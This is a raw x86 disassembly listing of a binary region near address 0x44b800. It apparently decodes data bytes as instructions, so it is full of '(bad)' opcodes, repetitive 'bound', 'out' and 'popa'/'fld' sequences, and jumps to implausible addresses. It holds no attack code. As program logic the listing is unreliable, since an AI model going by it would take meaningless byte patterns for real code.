  44b7bb:	add    BYTE PTR [eax],al
  44b7bd:	sti    
  44b7be:	xlat   BYTE PTR ds:[ebx]
  44b7bf:	add    BYTE PTR [eax],al
  44b7c1:	or     ebx,eax
  44b7c3:	add    BYTE PTR [eax],al
  44b7c5:	or     ebx,eax
  44b7c7:	add    BYTE PTR [eax],al
  44b7c9:	sti    
  44b7ca:	xlat   BYTE PTR ds:[ebx]
  44b7cb:	add    BYTE PTR [eax],al
  44b7cd:	sti    
  44b7ce:	xlat   BYTE PTR ds:[ebx]
  44b7cf:	add    BYTE PTR [eax],al
  44b7d1:	retf   
  44b7d2:	xlat   BYTE PTR ds:[ebx]
  44b7d3:	add    BYTE PTR [eax],al
  44b7d5:	retf   
  44b7d6:	xlat   BYTE PTR ds:[ebx]
  44b7d7:	add    BYTE PTR [eax],al
  44b7d9:	mov    ebx,0xbb0000d7
  44b7de:	xlat   BYTE PTR ds:[ebx]
  44b7df:	add    BYTE PTR [eax],al
  44b7e1:	add    bl,cl
  44b7e3:	xlat   BYTE PTR ds:[ebx]
  44b7e4:	add    BYTE PTR [eax],al
  44b7e6:	retf   
  44b7e7:	xlat   BYTE PTR ds:[ebx]
  44b7e8:	add    BYTE PTR [eax],al
  44b7ea:	mov    ebx,0xbb0000d7
  44b7ef:	xlat   BYTE PTR ds:[ebx]
  44b7f0:	add    BYTE PTR [eax],al
  44b7f2:	mov    edx,edi
  44b7f4:	add    BYTE PTR [eax],al
  44b7f6:	mov    edx,edi
  44b7f8:	add    BYTE PTR [eax],al
  44b7fa:	jnp    0x44b7d3
  44b7fc:	add    BYTE PTR [eax],al
  44b7fe:	jnp    0x44b7d7
  44b800:	add    BYTE PTR [eax],al
  44b802:	mov    edx,edi
  44b804:	add    BYTE PTR [eax],al
  44b806:	(bad)  
  44b808:	add    DWORD PTR [eax],eax
  44b80a:	(bad)  
  44b80c:	add    DWORD PTR [eax],eax
  44b80e:	(bad)  
  44b810:	add    DWORD PTR [eax],eax
  44b812:	(bad)  
  44b813:	lock add DWORD PTR [eax],eax
  44b816:	(bad)  
  44b817:	lock add DWORD PTR [eax],eax
  44b81a:	(bad)  
  44b81b:	lock add DWORD PTR [eax],eax
  44b81e:	(bad)  
  44b81f:	lock add DWORD PTR [eax],eax
  44b822:	(bad)  
  44b823:	lock add DWORD PTR [eax],eax
  44b826:	(bad)  
  44b827:	lock add DWORD PTR [eax],eax
  44b82a:	(bad)  
  44b82b:	lock add DWORD PTR [eax],eax
  44b82e:	(bad)  
  44b82f:	lock add DWORD PTR [eax],eax
  44b832:	(bad)  
  44b833:	lock add DWORD PTR [eax],eax
  44b836:	(bad)  
  44b837:	lock add DWORD PTR [eax],eax
  44b83a:	(bad)  
  44b83b:	lock add DWORD PTR [eax],eax
  44b83e:	(bad)  
  44b83f:	lock add DWORD PTR [eax],eax
  44b842:	(bad)  
  44b843:	lock add DWORD PTR [eax],eax
  44b846:	add    BYTE PTR [edx-0x10],ah
  44b849:	add    DWORD PTR [eax],eax
  44b84b:	(bad)  
  44b84c:	lock add DWORD PTR [eax],eax
  44b84f:	(bad)  
  44b850:	lock add DWORD PTR [eax],eax
  44b853:	(bad)  
  44b854:	lock add DWORD PTR [eax],eax
  44b857:	(bad)  
  44b858:	lock add DWORD PTR [eax],eax
  44b85b:	(bad)  
  44b85c:	lock add DWORD PTR [eax],eax
  44b85f:	(bad)  
  44b860:	lock add DWORD PTR [eax],eax
  44b863:	(bad)  
  44b864:	lock add DWORD PTR [eax],eax
  44b867:	(bad)  
  44b868:	lock add DWORD PTR [eax],eax
  44b86b:	(bad)  
  44b86c:	lock add DWORD PTR [eax],eax
  44b86f:	(bad)  
  44b870:	lock add DWORD PTR [eax],eax
  44b873:	(bad)  
  44b874:	lock add DWORD PTR [eax],eax
  44b877:	(bad)  
  44b878:	lock add DWORD PTR [eax],eax
  44b87b:	(bad)  
  44b87c:	lock add DWORD PTR [eax],eax
  44b87f:	(bad)  
  44b880:	(bad)  
  44b882:	add    esp,DWORD PTR [edx-0x27]
  44b885:	out    0x3,eax
  44b887:	(bad)  
  44b888:	(bad)  
  44b88a:	add    esp,DWORD PTR [edx-0x27]
  44b88d:	out    0x3,eax
  44b88f:	(bad)  
  44b890:	(bad)  
  44b892:	add    esp,DWORD PTR [edx-0x27]
  44b895:	out    0x3,eax
  44b897:	(bad)  
  44b898:	(bad)  
  44b89a:	add    esp,DWORD PTR [edx-0x27]
  44b89d:	out    0x3,eax
  44b89f:	(bad)  
  44b8a0:	(bad)  
  44b8a2:	add    esp,DWORD PTR [edx-0x27]
  44b8a5:	out    0x3,eax
  44b8a7:	(bad)  
  44b8a8:	(bad)  
  44b8aa:	add    eax,DWORD PTR [eax]
  44b8ac:	(bad)  
  44b8ad:	(bad)  
  44b8af:	add    esp,DWORD PTR [edx-0x27]
  44b8b2:	out    0x3,eax
  44b8b4:	(bad)  
  44b8b5:	(bad)  
  44b8b7:	add    esp,DWORD PTR [edx-0x27]
  44b8ba:	out    0x3,eax
  44b8bc:	(bad)  
  44b8bd:	(bad)  
  44b8bf:	add    esp,DWORD PTR [edx-0x27]
  44b8c2:	out    0x3,eax
  44b8c4:	(bad)  
  44b8c5:	(bad)  
  44b8c7:	add    esp,DWORD PTR [edx-0x27]
  44b8ca:	out    0x3,eax
  44b8cc:	(bad)  
  44b8cd:	(bad)  
  44b8cf:	add    esp,DWORD PTR [edx-0x27]
  44b8d2:	out    0x3,eax
  44b8d4:	(bad)  
  44b8d5:	(bad)  
  44b8d7:	add    esp,DWORD PTR [edx-0x27]
  44b8da:	out    0x3,eax
  44b8dc:	(bad)  
  44b8dd:	(bad)  
  44b8df:	add    esp,DWORD PTR [edx-0x27]
  44b8e2:	out    0x3,eax
  44b8e4:	(bad)  
  44b8e5:	(bad)  
  44b8e7:	add    esp,DWORD PTR [edx-0x27]
  44b8ea:	out    0x3,eax
  44b8ec:	(bad)  
  44b8ed:	(bad)  
  44b8ef:	add    esp,DWORD PTR [edx-0x27]
  44b8f2:	out    0x3,eax
  44b8f4:	(bad)  
  44b8f5:	(bad)  
  44b8f7:	add    esp,DWORD PTR [edx-0x27]
  44b8fa:	add    cl,ch
  44b8fc:	popa   
  44b8fd:	fld    DWORD PTR [eax]
  44b8ff:	jmp    0xe9459265
  44b904:	popa   
  44b905:	fld    DWORD PTR [eax]
  44b907:	jmp    0xe945926d
  44b90c:	popa   
  44b90d:	fld    DWORD PTR [eax]
  44b90f:	jmp    0x11e1a14
  44b914:	jmp    0xe945927a
  44b919:	popa   
  44b91a:	fld    DWORD PTR [eax]
  44b91c:	jmp    0xe9459282
  44b921:	popa   
  44b922:	fld    DWORD PTR [eax]
  44b924:	jmp    0xe945928a
  44b929:	popa   
  44b92a:	fld    DWORD PTR [eax]
  44b92c:	jmp    0xe9459292
  44b931:	popa   
  44b932:	fld    DWORD PTR [eax]
  44b934:	jmp    0xe945929a
  44b939:	popa   
  44b93a:	fld    DWORD PTR [eax]
  44b93c:	jmp    0xe94592a2
  44b941:	popa   
  44b942:	fld    DWORD PTR [eax]
  44b944:	jmp    0xe94592aa
  44b949:	popa   
  44b94a:	fld    DWORD PTR [eax]
  44b94c:	jmp    0xe94592b2
  44b951:	popa   
  44b952:	fld    DWORD PTR [eax]
  44b954:	jmp    0xe94592ba
  44b959:	popa   
  44b95a:	fld    DWORD PTR [eax]
  44b95c:	jmp    0xe94592c2
  44b961:	popa   
  44b962:	fld    DWORD PTR [eax]
  44b964:	jmp    0xe94592ca
  44b969:	popa   
  44b96a:	fld    DWORD PTR [eax]
  44b96c:	jmp    0xe94592d2
  44b971:	popa   
  44b972:	fld    DWORD PTR [eax]
  44b974:	add    BYTE PTR [eax],al
  44b976:	mov    ebx,esp
  44b978:	add    BYTE PTR [eax],al
  44b97a:	mov    ebx,esp
  44b97c:	add    BYTE PTR [eax],al
  44b97e:	jnp    0x44b95c
  44b980:	add    BYTE PTR [eax],al
  44b982:	jnp    0x44b960
  44b984:	add    BYTE PTR [eax],al
  44b986:	mov    ebx,esp
  44b988:	add    BYTE PTR [eax],al
  44b98a:	mov    ebx,esp
  44b98c:	add    BYTE PTR [eax],al
  44b98e:	jnp    0x44b96c
  44b990:	add    BYTE PTR [eax],al
  44b992:	jnp    0x44b970
  44b994:	add    BYTE PTR [eax],al
  44b996:	dec    ebx
  44b997:	fadd   QWORD PTR [eax]
  44b999:	add    BYTE PTR [ebx-0x24],cl
  44b99c:	add    BYTE PTR [eax],al
  44b99e:	cmp    ebx,esp
  44b9a0:	add    BYTE PTR [eax],al
  44b9a2:	cmp    ebx,esp
  44b9a4:	add    BYTE PTR [eax],al
  44b9a6:	dec    ebx
  44b9a7:	fadd   QWORD PTR [eax]
  44b9a9:	add    BYTE PTR [ebx-0x24],cl
  44b9ac:	add    BYTE PTR [eax],al
  44b9ae:	cmp    ebx,esp
  44b9b0:	add    BYTE PTR [eax],al
  44b9b2:	cmp    ebx,esp
  44b9b4:	add    BYTE PTR [eax],al
  44b9b6:	or     ebx,esp
  44b9b8:	add    BYTE PTR [eax],al
  44b9ba:	or     ebx,esp
  44b9bc:	add    BYTE PTR [eax],al
  44b9be:	sti    
  44b9bf:	fild   DWORD PTR [eax]
  44b9c1:	add    bl,bh
  44b9c3:	fild   DWORD PTR [eax]
  44b9c5:	add    BYTE PTR [ebx],cl
  44b9c7:	fadd   QWORD PTR [eax]
  44b9c9:	add    BYTE PTR [ebx],cl
  44b9cb:	fadd   QWORD PTR [eax]
  44b9cd:	add    bl,bh
  44b9cf:	fild   DWORD PTR [eax]
  44b9d1:	add    bl,bh
  44b9d3:	fild   DWORD PTR [eax]
  44b9d5:	add    bl,cl
  44b9d7:	fild   DWORD PTR [eax]
  44b9d9:	add    BYTE PTR [eax],al
  44b9db:	retf   
  44b9dc:	fild   DWORD PTR [eax]
  44b9de:	add    BYTE PTR [ebx-0x44ffff25],bh
  44b9e4:	fild   DWORD PTR [eax]
  44b9e6:	add    bl,cl
  44b9e8:	fild   DWORD PTR [eax]
  44b9ea:	add    bl,cl
  44b9ec:	fild   DWORD PTR [eax]
  44b9ee:	add    BYTE PTR [edx+0x2],ah
  44b9f1:	add    al,BYTE PTR [eax]
  44b9f3:	bound  eax,QWORD PTR [edx]
  44b9f5:	add    al,BYTE PTR [eax]
  44b9f7:	bound  eax,QWORD PTR [edx]
  44b9f9:	add    al,BYTE PTR [eax]
  44b9fb:	bound  eax,QWORD PTR [edx]
  44b9fd:	add    al,BYTE PTR [eax]
  44b9ff:	bound  eax,QWORD PTR [edx]
  44ba01:	add    al,BYTE PTR [eax]
  44ba03:	bound  eax,QWORD PTR [edx]
  44ba05:	add    al,BYTE PTR [eax]
  44ba07:	bound  eax,QWORD PTR [edx]
  44ba09:	add    al,BYTE PTR [eax]
  44ba0b:	bound  eax,QWORD PTR [edx]
  44ba0d:	add    al,BYTE PTR [eax]
  44ba0f:	bound  eax,QWORD PTR [edx]
  44ba11:	add    al,BYTE PTR [eax]
  44ba13:	bound  eax,QWORD PTR [edx]
  44ba15:	add    al,BYTE PTR [eax]
  44ba17:	bound  eax,QWORD PTR [eax]
  44ba19:	add    al,BYTE PTR [eax]
  44ba1b:	bound  eax,QWORD PTR [eax]
  44ba1d:	add    al,BYTE PTR [eax]
  44ba1f:	bound  eax,QWORD PTR [eax]
  44ba21:	add    al,BYTE PTR [eax]
  44ba23:	bound  eax,QWORD PTR [eax]
  44ba25:	add    al,BYTE PTR [eax]
  44ba27:	bound  eax,QWORD PTR [eax]
  44ba29:	add    al,BYTE PTR [eax]
  44ba2b:	bound  eax,QWORD PTR [eax]
  44ba2d:	add    al,BYTE PTR [eax]
  44ba2f:	bound  eax,QWORD PTR [eax]
  44ba31:	add    al,BYTE PTR [eax]
  44ba33:	bound  eax,QWORD PTR [eax]
  44ba35:	add    al,BYTE PTR [eax]
  44ba37:	bound  eax,QWORD PTR [eax]
  44ba39:	add    al,BYTE PTR [eax]
  44ba3b:	bound  eax,QWORD PTR [eax]
  44ba3d:	add    al,BYTE PTR [eax]
  44ba3f:	add    BYTE PTR [edx+0x0],ah
  44ba42:	add    al,BYTE PTR [eax]
  44ba44:	bound  eax,QWORD PTR [eax]
  44ba46:	add    al,BYTE PTR [eax]
  44ba48:	bound  eax,QWORD PTR [eax]
  44ba4a:	add    al,BYTE PTR [eax]
  44ba4c:	bound  eax,QWORD PTR [eax]
  44ba4e:	add    al,BYTE PTR [eax]
  44ba50:	bound  eax,QWORD PTR [eax]
  44ba52:	add    al,BYTE PTR [eax]
  44ba54:	bound  eax,QWORD PTR [eax]
  44ba56:	add    al,BYTE PTR [eax]
  44ba58:	bound  eax,QWORD PTR [eax]
  44ba5a:	add    al,BYTE PTR [eax]
  44ba5c:	bound  eax,QWORD PTR [eax]
  44ba5e:	add    al,BYTE PTR [eax]
  44ba60:	bound  eax,QWORD PTR [eax]
  44ba62:	add    al,BYTE PTR [eax]
  44ba64:	bound  eax,QWORD PTR [eax]
  44ba66:	add    al,BYTE PTR [eax]
  44ba68:	(bad)  
  44ba69:	(bad)  
  44ba6b:	add    esp,DWORD PTR [edx-0x27]
  44ba6e:	out    0x3,eax
  44ba70:	(bad)  
  44ba71:	(bad)  
  44ba73:	add    esp,DWORD PTR [edx-0x27]
  44ba76:	out    0x3,eax
  44ba78:	(bad)  
  44ba79:	(bad)  
  44ba7b:	add    esp,DWORD PTR [edx-0x27]
  44ba7e:	out    0x3,eax
  44ba80:	(bad)  
  44ba81:	(bad)  
  44ba83:	add    esp,DWORD PTR [edx-0x27]
  44ba86:	out    0x3,eax
  44ba88:	(bad)  
  44ba89:	(bad)  
  44ba8b:	add    esp,DWORD PTR [edx-0x27]
  44ba8e:	out    0x3,eax
  44ba90:	(bad)  
  44ba91:	(bad)  
  44ba93:	add    esp,DWORD PTR [edx-0x27]
  44ba96:	out    0x3,eax
  44ba98:	(bad)  
  44ba99:	(bad)  
  44ba9b:	add    esp,DWORD PTR [edx-0x27]
  44ba9e:	out    0x3,eax
  44baa0:	(bad)  
  44baa1:	(bad)  
  44baa3:	add    eax,DWORD PTR [eax]
  44baa5:	(bad)  
  44baa6:	(bad)  
  44baa8:	add    esp,DWORD PTR [edx-0x27]
  44baab:	out    0x3,eax
  44baad:	(bad)  
  44baae:	(bad)  
  44bab0:	add    esp,DWORD PTR [edx-0x27]
  44bab3:	out    0x3,eax
  44bab5:	(bad)  
  44bab6:	(bad)  
  44bab8:	add    esp,DWORD PTR [edx-0x27]
  44babb:	out    0x3,eax
  44babd:	(bad)  
  44babe:	(bad)  
  44bac0:	add    esp,DWORD PTR [edx-0x27]
  44bac3:	out    0x3,eax
  44bac5:	(bad)  
  44bac6:	(bad)  
  44bac8:	add    esp,DWORD PTR [edx-0x27]
  44bacb:	out    0x3,eax
  44bacd:	(bad)  
  44bace:	(bad)  
  44bad0:	add    esp,DWORD PTR [edx-0x27]
  44bad3:	out    0x3,eax
  44bad5:	(bad)  
  44bad6:	(bad)  
  44bad8:	add    esp,DWORD PTR [edx-0x27]
  44badb:	out    0x3,eax
  44badd:	(bad)  
  44bade:	(bad)  
  44bae0:	add    esp,DWORD PTR [edx-0x27]
  44bae3:	add    cl,ch
  44bae5:	popa   
  44bae6:	fld    DWORD PTR [eax]
  44bae8:	jmp    0xe945944e
  44baed:	popa   
  44baee:	fld    DWORD PTR [eax]
  44baf0:	jmp    0xe9459456
  44baf5:	popa   
  44baf6:	fld    DWORD PTR [eax]
  44baf8:	jmp    0xe945945e
  44bafd:	popa   
  44bafe:	fld    DWORD PTR [eax]
  44bb00:	jmp    0xe9459466
  44bb05:	popa   
  44bb06:	fld    DWORD PTR [eax]
  44bb08:	jmp    0x11e1c0d
  44bb0d:	jmp    0xe9459473
  44bb12:	popa   
  44bb13:	fld    DWORD PTR [eax]
  44bb15:	jmp    0xe945947b
  44bb1a:	popa   
  44bb1b:	fld    DWORD PTR [eax]
  44bb1d:	jmp    0xe9459483
  44bb22:	popa   
  44bb23:	fld    DWORD PTR [eax]
  44bb25:	jmp    0xe945948b
  44bb2a:	popa   
  44bb2b:	fld    DWORD PTR [eax]
  44bb2d:	jmp    0xe9459493
  44bb32:	popa   
  44bb33:	fld    DWORD PTR [eax]
  44bb35:	jmp    0xe945949b
  44bb3a:	popa   
  44bb3b:	fld    DWORD PTR [eax]
  44bb3d:	jmp    0xe94594a3
  44bb42:	popa   
  44bb43:	fld    DWORD PTR [eax]
  44bb45:	jmp    0xe94594ab
  44bb4a:	popa   
  44bb4b:	fld    DWORD PTR [eax]
  44bb4d:	jmp    0xe94594b3
  44bb52:	popa   
  44bb53:	fld    DWORD PTR [eax]
  44bb55:	jmp    0xe94594bb
  44bb5a:	popa   
  44bb5b:	fld    DWORD PTR [eax]
  44bb5d:	add    bl,cl
  44bb5f:	fadd   DWORD PTR [eax]
  44bb61:	add    BYTE PTR [ebx-0x44ffff28],bh
  44bb67:	fadd   DWORD PTR [eax]
  44bb69:	add    bl,cl
  44bb6b:	fadd   DWORD PTR [eax]
  44bb6d:	add    BYTE PTR [eax],al
  44bb6f:	retf   
  44bb70:	fadd   DWORD PTR [eax]
  44bb72:	add    BYTE PTR [ebx-0x44ffff28],bh
  44bb78:	fadd   DWORD PTR [eax]
  44bb7a:	add    BYTE PTR [ebx-0x74ffff28],cl
  44bb80:	fadd   DWORD PTR [eax]
  44bb82:	add    BYTE PTR [ebx-0x28],bh
  44bb85:	add    BYTE PTR [eax],al
  44bb87:	jnp    0x44bb61
  44bb89:	add    BYTE PTR [eax],al
  44bb8b:	mov    ebx,eax
  44bb8d:	add    BYTE PTR [eax],al
  44bb8f:	mov    ebx,eax
  44bb91:	add    BYTE PTR [eax],al
  44bb93:	jnp    0x44bb6d
  44bb95:	add    BYTE PTR [eax],al
  44bb97:	jnp    0x44bb71
  44bb99:	add    BYTE PTR [eax],al
  44bb9b:	dec    ebx
  44bb9c:	fadd   DWORD PTR [eax]
  44bb9e:	add    BYTE PTR [ebx-0x28],cl
  44bba1:	add    BYTE PTR [eax],al
  44bba3:	cmp    ebx,eax
  44bba5:	add    BYTE PTR [eax],al
  44bba7:	cmp    ebx,eax
  44bba9:	add    BYTE PTR [eax],al
  44bbab:	dec    ebx
  44bbac:	fadd   DWORD PTR [eax]
  44bbae:	add    BYTE PTR [ebx-0x28],cl
  44bbb1:	add    BYTE PTR [eax],al
  44bbb3:	cmp    ebx,eax
  44bbb5:	add    BYTE PTR [eax],al
  44bbb7:	cmp    ebx,eax
  44bbb9:	add    BYTE PTR [eax],al
  44bbbb:	or     ebx,eax
  44bbbd:	add    BYTE PTR [eax],al
  44bbbf:	or     ebx,eax
  44bbc1:	add    BYTE PTR [eax],al
  44bbc3:	sti    
  44bbc4:	xlat   BYTE PTR ds:[ebx]
  44bbc5:	add    BYTE PTR [eax],al
  44bbc7:	sti    
  44bbc8:	xlat   BYTE PTR ds:[ebx]
  44bbc9:	add    BYTE PTR [eax],al
  44bbcb:	or     ebx,eax
  44bbcd:	add    BYTE PTR [eax],al
  44bbcf:	or     ebx,eax
  44bbd1:	add    BYTE PTR [eax],al
  44bbd3:	add    bl,bh
  44bbd5:	xlat   BYTE PTR ds:[ebx]
  44bbd6:	add    BYTE PTR [eax],al
  44bbd8:	bound  eax,QWORD PTR [edx]
  44bbda:	add    al,BYTE PTR [eax]
  44bbdc:	bound  eax,QWORD PTR [edx]
  44bbde:	add    al,BYTE PTR [eax]
  44bbe0:	bound  eax,QWORD PTR [edx]
  44bbe2:	add    al,BYTE PTR [eax]
  44bbe4:	bound  eax,QWORD PTR [edx]
  44bbe6:	add    al,BYTE PTR [eax]
  44bbe8:	bound  eax,QWORD PTR [edx]
  44bbea:	add    al,BYTE PTR [eax]
  44bbec:	bound  eax,QWORD PTR [edx]
  44bbee:	add    al,BYTE PTR [eax]
  44bbf0:	bound  eax,QWORD PTR [edx]
  44bbf2:	add    al,BYTE PTR [eax]
  44bbf4:	bound  eax,QWORD PTR [edx]
  44bbf6:	add    al,BYTE PTR [eax]
  44bbf8:	bound  eax,QWORD PTR [edx]
  44bbfa:	add    al,BYTE PTR [eax]
  44bbfc:	bound  eax,QWORD PTR [edx]
  44bbfe:	add    al,BYTE PTR [eax]
  44bc00:	bound  eax,QWORD PTR [edx]
  44bc02:	add    al,BYTE PTR [eax]
  44bc04:	bound  eax,QWORD PTR [edx]
  44bc06:	add    al,BYTE PTR [eax]
  44bc08:	bound  eax,QWORD PTR [edx]
  44bc0a:	add    al,BYTE PTR [eax]
  44bc0c:	bound  eax,QWORD PTR [edx]
  44bc0e:	add    al,BYTE PTR [eax]
  44bc10:	bound  eax,QWORD PTR [edx]
  44bc12:	add    al,BYTE PTR [eax]
  44bc14:	bound  eax,QWORD PTR [edx]
  44bc16:	add    al,BYTE PTR [eax]
  44bc18:	bound  eax,QWORD PTR [edx]
  44bc1a:	add    al,BYTE PTR [eax]
  44bc1c:	bound  eax,QWORD PTR [eax]
  44bc1e:	add    al,BYTE PTR [eax]
  44bc20:	bound  eax,QWORD PTR [eax]
  44bc22:	add    al,BYTE PTR [eax]
  44bc24:	bound  eax,QWORD PTR [eax]
  44bc26:	add    al,BYTE PTR [eax]
  44bc28:	bound  eax,QWORD PTR [eax]
  44bc2a:	add    al,BYTE PTR [eax]
  44bc2c:	bound  eax,QWORD PTR [eax]
  44bc2e:	add    al,BYTE PTR [eax]
  44bc30:	bound  eax,QWORD PTR [eax]
  44bc32:	add    al,BYTE PTR [eax]
  44bc34:	bound  eax,QWORD PTR [eax]
  44bc36:	add    al,BYTE PTR [eax]
  44bc38:	add    BYTE PTR [edx+0x0],ah
  44bc3b:	add    al,BYTE PTR [eax]
  44bc3d:	bound  eax,QWORD PTR [eax]
  44bc3f:	add    al,BYTE PTR [eax]
  44bc41:	bound  eax,QWORD PTR [eax]
  44bc43:	add    al,BYTE PTR [eax]
  44bc45:	bound  eax,QWORD PTR [eax]
  44bc47:	add    al,BYTE PTR [eax]
  44bc49:	bound  eax,QWORD PTR [eax]
  44bc4b:	add    al,BYTE PTR [eax]
  44bc4d:	bound  eax,QWORD PTR [eax]
  44bc4f:	add    al,BYTE PTR [eax]
  44bc51:	(bad)  
  44bc52:	(bad)  
  44bc54:	add    esp,DWORD PTR [edx-0x27]
  44bc57:	out    0x3,eax
  44bc59:	(bad)  
  44bc5a:	(bad)  
  44bc5c:	add    esp,DWORD PTR [edx-0x27]
  44bc5f:	out    0x3,eax
  44bc61:	(bad)  
  44bc62:	(bad)  
  44bc64:	add    esp,DWORD PTR [edx-0x27]
  44bc67:	out    0x3,eax
  44bc69:	(bad)  
  44bc6a:	(bad)  
  44bc6c:	add    esp,DWORD PTR [edx-0x27]
  44bc6f:	out    0x3,eax
  44bc71:	(bad)  
  44bc72:	(bad)  
  44bc74:	add    esp,DWORD PTR [edx-0x27]
  44bc77:	out    0x3,eax
  44bc79:	(bad)  
  44bc7a:	(bad)  
  44bc7c:	add    esp,DWORD PTR [edx-0x27]
  44bc7f:	out    0x3,eax
  44bc81:	(bad)  
  44bc82:	(bad)  
  44bc84:	add    esp,DWORD PTR [edx-0x27]
  44bc87:	out    0x3,eax
  44bc89:	(bad)  
  44bc8a:	(bad)  
  44bc8c:	add    esp,DWORD PTR [edx-0x27]
  44bc8f:	out    0x3,eax
  44bc91:	(bad)  
  44bc92:	(bad)  
  44bc94:	add    esp,DWORD PTR [edx-0x27]
  44bc97:	out    0x3,eax
  44bc99:	(bad)  
  44bc9a:	(bad)  
  44bc9c:	add    eax,DWORD PTR [eax]
  44bc9e:	(bad)  
  44bc9f:	(bad)  
  44bca1:	add    esp,DWORD PTR [edx-0x27]
  44bca4:	out    0x3,eax
  44bca6:	(bad)  
  44bca7:	(bad)  
  44bca9:	add    esp,DWORD PTR [edx-0x27]
  44bcac:	out    0x3,eax
  44bcae:	(bad)  
  44bcaf:	(bad)  
  44bcb1:	add    esp,DWORD PTR [edx-0x27]
  44bcb4:	out    0x3,eax
  44bcb6:	(bad)  
  44bcb7:	(bad)  
  44bcb9:	add    esp,DWORD PTR [edx-0x27]
  44bcbc:	out    0x3,eax
  44bcbe:	(bad)  
  44bcbf:	(bad)  
  44bcc1:	add    esp,DWORD PTR [edx-0x27]
  44bcc4:	out    0x3,eax
  44bcc6:	(bad)  
  44bcc7:	(bad)  
  44bcc9:	add    esp,DWORD PTR [edx-0x27]
  44bccc:	add    cl,ch
  44bcce:	popa   
  44bccf:	fld    DWORD PTR [eax]
  44bcd1:	jmp    0xe9459637
  44bcd6:	popa   
  44bcd7:	fld    DWORD PTR [eax]
  44bcd9:	jmp    0xe945963f
  44bcde:	popa   
  44bcdf:	fld    DWORD PTR [eax]
  44bce1:	jmp    0xe9459647
  44bce6:	popa   
  44bce7:	fld    DWORD PTR [eax]
  44bce9:	jmp    0xe945964f
  44bcee:	popa   
  44bcef:	fld    DWORD PTR [eax]
  44bcf1:	jmp    0xe9459657
  44bcf6:	popa   
  44bcf7:	fld    DWORD PTR [eax]
  44bcf9:	jmp    0xe945965f
  44bcfe:	popa   
  44bcff:	fld    DWORD PTR [eax]
  44bd01:	jmp    0x11e1e06
  44bd06:	jmp    0xe945966c
  44bd0b:	popa   
  44bd0c:	fld    DWORD PTR [eax]
  44bd0e:	jmp    0xe9459674
  44bd13:	popa   
  44bd14:	fld    DWORD PTR [eax]
  44bd16:	jmp    0xe945967c
  44bd1b:	popa   
  44bd1c:	fld    DWORD PTR [eax]
  44bd1e:	jmp    0xe9459684
  44bd23:	popa   
  44bd24:	fld    DWORD PTR [eax]
  44bd26:	jmp    0xe945968c
  44bd2b:	popa   
  44bd2c:	fld    DWORD PTR [eax]
  44bd2e:	jmp    0xe9459694
  44bd33:	popa   
  44bd34:	fld    DWORD PTR [eax]
  44bd36:	jmp    0xe945969c
  44bd3b:	popa   
  44bd3c:	fld    DWORD PTR [eax]
  44bd3e:	jmp    0xe94596a4
  44bd43:	popa   
  44bd44:	fld    DWORD PTR [eax]
  44bd46:	add    bl,bh
  44bd48:	fadd   QWORD PTR [eax]
  44bd4a:	add    bl,bh
  44bd4c:	fadd   QWORD PTR [eax]
  44bd4e:	add    BYTE PTR [ebx],cl
  44bd50:	fld    QWORD PTR [eax]
  44bd52:	add    BYTE PTR [ebx],cl
  44bd54:	fld    QWORD PTR [eax]
  44bd56:	add    bl,bh
  44bd58:	fadd   QWORD PTR [eax]
  44bd5a:	add    bl,bh
  44bd5c:	fadd   QWORD PTR [eax]
  44bd5e:	add    bl,cl
  44bd60:	fadd   QWORD PTR [eax]
  44bd62:	add    bl,cl
  44bd64:	fadd   QWORD PTR [eax]
  44bd66:	add    BYTE PTR [eax],al
  44bd68:	mov    ebx,0xbb0000dc
  44bd6d:	fadd   QWORD PTR [eax]
  44bd6f:	add    bl,cl
  44bd71:	fadd   QWORD PTR [eax]
  44bd73:	add    bl,cl
  44bd75:	fadd   QWORD PTR [eax]
  44bd77:	add    BYTE PTR [ebx-0x44ffff24],bh
  44bd7d:	fadd   QWORD PTR [eax]
  44bd7f:	add    BYTE PTR [ebx-0x74ffff24],cl
  44bd85:	fadd   QWORD PTR [eax]
  44bd87:	add    BYTE PTR [ebx-0x24],bh
  44bd8a:	add    BYTE PTR [eax],al
  44bd8c:	jnp    0x44bd6a
  44bd8e:	add    BYTE PTR [eax],al
  44bd90:	mov    ebx,esp
  44bd92:	add    BYTE PTR [eax],al
  44bd94:	mov    ebx,esp
  44bd96:	add    BYTE PTR [eax],al
  44bd98:	jnp    0x44bd76
  44bd9a:	add    BYTE PTR [eax],al
  44bd9c:	jnp    0x44bd7a
  44bd9e:	add    BYTE PTR [eax],al
  44bda0:	dec    ebx
  44bda1:	fadd   QWORD PTR [eax]
  44bda3:	add    BYTE PTR [ebx-0x24],cl
  44bda6:	add    BYTE PTR [eax],al
  44bda8:	cmp    ebx,esp
  44bdaa:	add    BYTE PTR [eax],al
  44bdac:	cmp    ebx,esp
  44bdae:	add    BYTE PTR [eax],al
  44bdb0:	dec    ebx
  44bdb1:	fadd   QWORD PTR [eax]
  44bdb3:	add    BYTE PTR [ebx-0x24],cl
  44bdb6:	add    BYTE PTR [eax],al
  44bdb8:	cmp    ebx,esp
  44bdba:	add    BYTE PTR [eax],al
  44bdbc:	cmp    ebx,esp
  44bdbe:	add    BYTE PTR [eax],al
  44bdc0:	bound  eax,QWORD PTR [edx]
  44bdc2:	add    al,BYTE PTR [eax]
  44bdc4:	bound  eax,QWORD PTR [edx]
  44bdc6:	add    al,BYTE PTR [eax]
  44bdc8:	bound  eax,QWORD PTR [edx]
  44bdca:	add    al,BYTE PTR [eax]
  44bdcc:	add    BYTE PTR [edx+0x2],ah
  44bdcf:	add    al,BYTE PTR [eax]
  44bdd1:	bound  eax,QWORD PTR [edx]
  44bdd3:	add    al,BYTE PTR [eax]
  44bdd5:	bound  eax,QWORD PTR [edx]
  44bdd7:	add    al,BYTE PTR [eax]
  44bdd9:	bound  eax,QWORD PTR [edx]
  44bddb:	add    al,BYTE PTR [eax]
  44bddd:	bound  eax,QWORD PTR [edx]
  44bddf:	add    al,BYTE PTR [eax]
  44bde1:	bound  eax,QWORD PTR [edx]
  44bde3:	add    al,BYTE PTR [eax]
  44bde5:	bound  eax,QWORD PTR [edx]
  44bde7:	add    al,BYTE PTR [eax]
  44bde9:	bound  eax,QWORD PTR [edx]
  44bdeb:	add    al,BYTE PTR [eax]
  44bded:	bound  eax,QWORD PTR [edx]
  44bdef:	add    al,BYTE PTR [eax]
  44bdf1:	bound  eax,QWORD PTR [edx]
  44bdf3:	add    al,BYTE PTR [eax]
  44bdf5:	bound  eax,QWORD PTR [edx]
  44bdf7:	add    al,BYTE PTR [eax]
  44bdf9:	bound  eax,QWORD PTR [edx]
